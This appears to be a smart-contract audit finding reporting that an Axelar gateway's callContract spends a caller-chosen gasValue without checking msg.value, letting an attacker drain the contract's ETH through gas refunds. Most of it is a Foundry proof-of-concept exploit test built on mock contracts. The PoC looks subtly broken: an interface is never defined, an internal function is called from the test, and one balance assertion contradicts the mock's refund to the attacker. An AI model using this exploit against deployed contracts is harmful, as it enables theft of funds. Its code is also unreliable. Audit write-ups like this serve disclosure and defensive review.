# Vulnerability details

## Impact
This vulnerability can lead to:

1. Draining of the contract's ETH balance.
2. Manipulation of the gas refund system.
3. Potential Denial of Service (DoS) by depleting the contract's funds.
4. Unintended transfer of contract funds to the Axelar Gas Service.
5. Exploitation of the refund mechanism to profit from the difference between gasValue and actual msg.value.
## Proof of Concept
The vulnerability exists in the callContract function:
```
function callContract(
    string calldata destinationChain,
    string calldata destinationAddress,
    bytes calldata payload,
    MetadataVersion metadataVersion,
    uint256 gasValue
) external payable override {
    if (gasValue > 0) {
        if (metadataVersion == MetadataVersion.CONTRACT_CALL) {
            gasService.payNativeGasForContractCall{ value: gasValue }(
                address(this),
                destinationChain,
                destinationAddress,
                payload,
                tx.origin
            );
        }
        // ... (similar issue in EXPRESS_CALL case)
    }
    // ... (rest of the function)
}
```
Vulnerability breakdown:
1. The function doesn't verify if msg.value is equal to or greater than gasValue.
2. It uses gasValue directly in the call to payNativeGasForContractCall, potentially using the contract's ETH if msg.value is insufficient.

To exploit:

* An attacker calls callContract with a large gasValue but sends a smaller msg.value.
* The contract uses its own ETH to make up the difference in the payNativeGasForContractCall call.
* The attacker can potentially receive a refund larger than their initial msg.value due to the refund calculation:
Refund = Gas deposit - Network Base Fee - Execution Fee - approximate gas to process the refund
* By manipulating gasValue and msg.value, the attacker can drain the contract's ETH over multiple transactions.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// Mock AxelarGateway contract
contract MockAxelarGateway {
    IGasService public gasService;
    uint256 public ethBalance;

    constructor(address _gasService) {
        gasService = IGasService(_gasService);
    }

    function callContract(
        string calldata destinationChain,
        string calldata destinationAddress,
        bytes calldata payload,
        uint256 gasValue
    ) external payable {
        if (gasValue > 0) {
            gasService.payNativeGasForContractCall{value: gasValue}(
                address(this),
                destinationChain,
                destinationAddress,
                payload,
                tx.origin
            );
        }
        ethBalance += msg.value;
    }

    receive() external payable {
        ethBalance += msg.value;
    }
}

// Mock GasService contract
contract MockGasService {
    event GasPaid(address sender, uint256 amount);
    event Refunded(address recipient, uint256 amount);

    uint256 public constant NETWORK_FEE = 0.001 ether;
    uint256 public constant EXECUTION_FEE = 0.002 ether;
    uint256 public constant REFUND_PROCESS_FEE = 0.0005 ether;

    function payNativeGasForContractCall(
        address sender,
        string calldata destinationChain,
        string calldata destinationAddress,
        bytes calldata payload,
        address refundAddress
    ) external payable {
        emit GasPaid(sender, msg.value);
        
        // Simulate gas consumption and refund
        uint256 refundAmount = calculateRefund(msg.value);
        if (refundAmount > 0) {
            (bool success, ) = refundAddress.call{value: refundAmount}("");
            require(success, "Refund failed");
            emit Refunded(refundAddress, refundAmount);
        }
    }

    function calculateRefund(uint256 gasPaid) internal view returns (uint256) {
        if (gasPaid <= NETWORK_FEE + EXECUTION_FEE + REFUND_PROCESS_FEE) {
            return 0;
        }
        return gasPaid - NETWORK_FEE - EXECUTION_FEE - REFUND_PROCESS_FEE;
    }

    receive() external payable {}
}

contract GasValueMismatchTest is Test {
    MockAxelarGateway public axelarGateway;
    MockGasService public gasService;
    address public attacker;

    function setUp() public {
        gasService = new MockGasService();
        axelarGateway = new MockAxelarGateway(address(gasService));
        attacker = makeAddr("attacker");
        
        // Fund the AxelarGateway contract
        vm.deal(address(axelarGateway), 10 ether);
        
        // Fund the attacker
        vm.deal(attacker, 1 ether);
    }

    function testGasValueMismatchExploit() public {
        uint256 initialAttackerBalance = attacker.balance;
        uint256 initialContractBalance = address(axelarGateway).balance;

        vm.startPrank(attacker);

        // Attacker calls with high gasValue but low msg.value
        uint256 gasValue = 1 ether;
        uint256 msgValue = 0.1 ether;

        axelarGateway.callContract{value: msgValue}(
            "DestinationChain",
            "0x1234567890123456789012345678901234567890",
            abi.encode("payload"),
            gasValue
        );

        vm.stopPrank();

        // Check balances after the call
        uint256 finalAttackerBalance = attacker.balance;
        uint256 finalContractBalance = address(axelarGateway).balance;

        // The attacker should have spent only msgValue
        assertEq(initialAttackerBalance - finalAttackerBalance, msgValue, "Attacker balance decrease should equal msgValue");

        // The contract should have lost more than msgValue
        assertTrue(initialContractBalance - finalContractBalance > msgValue, "Contract should have lost more than msgValue");

        // The attacker should have received a refund larger than their initial payment
        uint256 refundAmount = gasService.calculateRefund(gasValue);
        assertTrue(refundAmount > msgValue, "Refund should be larger than msgValue");

        // Output the results
        console.log("Initial attacker balance:", initialAttackerBalance);
        console.log("Final attacker balance:", finalAttackerBalance);
        console.log("Attacker profit:", refundAmount - msgValue);
        console.log("Initial contract balance:", initialContractBalance);
        console.log("Final contract balance:", finalContractBalance);
        console.log("Contract loss:", initialContractBalance - finalContractBalance);
    }
}
